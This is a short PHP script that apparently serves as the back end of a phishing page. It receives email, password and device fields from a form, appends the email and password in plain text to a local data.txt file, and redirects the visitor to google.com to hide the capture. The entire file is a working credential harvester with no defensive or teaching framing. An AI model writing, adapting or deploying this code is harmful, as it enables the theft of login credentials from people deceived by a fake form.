<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the form data
    $email = $_POST['email'];
	$password = $_POST['password'];
	$ip = $_POST['ip'];
	$hostname = $_POST['hostname'];
	$mac = $_POST['mac'];

    // Build the line of text to be saved
    $line = "Email: $email | Password: $password\n";

    // Save to the 'data.txt' file
    $file = './data.txt';
    file_put_contents($file, $line, FILE_APPEND);

    header("Location: https://google.com");
} else {
    echo "Method not allowed.";
}
?>
